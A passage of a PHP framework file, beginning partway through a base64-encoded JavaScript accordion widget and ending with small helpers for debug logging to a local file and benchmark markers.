W9ucy5vcGFjaXR5KXt0aGlzLmVmZmVjdHMub3BhY2l0eT0iZnVsbE9wYWNpdHkiO31pZih0aGlzLm9wdGlvbnMud2lkdGgpe3RoaXMuZWZmZWN0cy53aWR0aD10aGlzLm9wdGlvbnMuZml4ZWRXaWR0aD8iZnVsbFdpZHRoIjoib2Zmc2V0V2lkdGgiOwp9aWYodGhpcy5vcHRpb25zLmhlaWdodCl7dGhpcy5lZmZlY3RzLmhlaWdodD10aGlzLm9wdGlvbnMuZml4ZWRIZWlnaHQ/ImZ1bGxIZWlnaHQiOiJzY3JvbGxIZWlnaHQiO31mb3IodmFyIEI9MCxBPXRoaXMudG9nZ2xlcnMubGVuZ3RoO0I8QTtCKyspe3RoaXMuYWRkU2VjdGlvbih0aGlzLnRvZ2dsZXJzW0JdLHRoaXMuZWxlbWVudHNbQl0pOwp9dGhpcy5lbGVtZW50cy5lYWNoKGZ1bmN0aW9uKEUsRCl7aWYodGhpcy5vcHRpb25zLnNob3c9PT1EKXt0aGlzLmZpcmVFdmVudCgiYWN0aXZlIixbdGhpcy50b2dnbGVyc1tEXSxFXSk7fWVsc2V7Zm9yKHZhciBGIGluIHRoaXMuZWZmZWN0cyl7RS5zZXRTdHlsZShGLDApOwp9fX0sdGhpcyk7aWYoJGNoayh0aGlzLm9wdGlvbnMuZGlzcGxheSkpe3RoaXMuZGlzcGxheSh0aGlzLm9wdGlvbnMuZGlzcGxheSk7fX0sYWRkU2VjdGlvbjpmdW5jdGlvbihFLEMsRyl7RT0kKEUpO0M9JChDKTt2YXIgRj10aGlzLnRvZ2dsZXJzLmNvbnRhaW5zKEUpOwp2YXIgQj10aGlzLnRvZ2dsZXJzLmxlbmd0aDt0aGlzLnRvZ2dsZXJzLmluY2x1ZGUoRSk7dGhpcy5lbGVtZW50cy5pbmNsdWRlKEMpO2lmKEImJighRnx8Rykpe0c9JHBpY2soRyxCLTEpO0UuaW5qZWN0KHRoaXMudG9nZ2xlcnNbR10sImJlZm9yZSIpO0MuaW5qZWN0KEUsImFmdGVyIik7Cn1lbHNle2lmKHRoaXMuY29udGFpbmVyJiYhRil7RS5pbmplY3QodGhpcy5jb250YWluZXIpO0MuaW5qZWN0KHRoaXMuY29udGFpbmVyKTt9fXZhciBBPXRoaXMudG9nZ2xlcnMuaW5kZXhPZihFKTtFLmFkZEV2ZW50KCJjbGljayIsdGhpcy5kaXNwbGF5LmJpbmQodGhpcyxBKSk7CmlmKHRoaXMub3B0aW9ucy5oZWlnaHQpe0Muc2V0U3R5bGVzKHsicGFkZGluZy10b3AiOjAsImJvcmRlci10b3AiOiJub25lIiwicGFkZGluZy1ib3R0b20iOjAsImJvcmRlci1ib3R0b20iOiJub25lIn0pO31pZih0aGlzLm9wdGlvbnMud2lkdGgpe0Muc2V0U3R5bGVzKHsicGFkZGluZy1sZWZ0IjowLCJib3JkZXItbGVmdCI6Im5vbmUiLCJwYWRkaW5nLXJpZ2h0IjowLCJib3JkZXItcmlnaHQiOiJub25lIn0pOwp9Qy5mdWxsT3BhY2l0eT0xO2lmKHRoaXMub3B0aW9ucy5maXhlZFdpZHRoKXtDLmZ1bGxXaWR0aD10aGlzLm9wdGlvbnMuZml4ZWRXaWR0aDt9aWYodGhpcy5vcHRpb25zLmZpeGVkSGVpZ2h0KXtDLmZ1bGxIZWlnaHQ9dGhpcy5vcHRpb25zLmZpeGVkSGVpZ2h0O31DLnNldFN0eWxlKCJvdmVyZmxvdyIsImhpZGRlbiIpOwppZighRil7Zm9yKHZhciBEIGluIHRoaXMuZWZmZWN0cyl7Qy5zZXRTdHlsZShELDApO319cmV0dXJuIHRoaXM7fSxkaXNwbGF5OmZ1bmN0aW9uKEEpe0E9KCR0eXBlKEEpPT0iZWxlbWVudCIpP3RoaXMuZWxlbWVudHMuaW5kZXhPZihBKTpBO2lmKCh0aGlzLnRpbWVyJiZ0aGlzLm9wdGlvbnMud2FpdCl8fChBPT09dGhpcy5wcmV2aW91cyYmIXRoaXMub3B0aW9ucy5hbHdheXNIaWRlKSl7cmV0dXJuIHRoaXM7Cn10aGlzLnByZXZpb3VzPUE7dmFyIEI9e307dGhpcy5lbGVtZW50cy5lYWNoKGZ1bmN0aW9uKEUsRCl7QltEXT17fTt2YXIgQz0oRCE9QSl8fCh0aGlzLm9wdGlvbnMuYWx3YXlzSGlkZSYmKEUub2Zmc2V0SGVpZ2h0PjApKTt0aGlzLmZpcmVFdmVudChDPyJiYWNrZ3JvdW5kIjoiYWN0aXZlIixbdGhpcy50b2dnbGVyc1tEXSxFXSk7CmZvcih2YXIgRiBpbiB0aGlzLmVmZmVjdHMpe0JbRF1bRl09Qz8wOkVbdGhpcy5lZmZlY3RzW0ZdXTt9fSx0aGlzKTtyZXR1cm4gdGhpcy5zdGFydChCKTt9fSk7Cg=="); break; default: } } function XTRACE($sMessage) { if (XTRACE_LOG) { if (func_num_args()>1) { $tab = func_get_args(); $sMessage=call_user_func_array('sprintf',$tab); } error_log($sMessage,3,'./XTRACE.log'); } } function XBENCH_MARKER($sMarqueur) { if (_DEBUG_BENCHMARK_ && XVER_PEAR && XVER_PEAR_BENCHMARK) { $GLOBALS['FMK_DEBUG_BENCHMARK']->F40e9c253($sMarqueur); } } ?>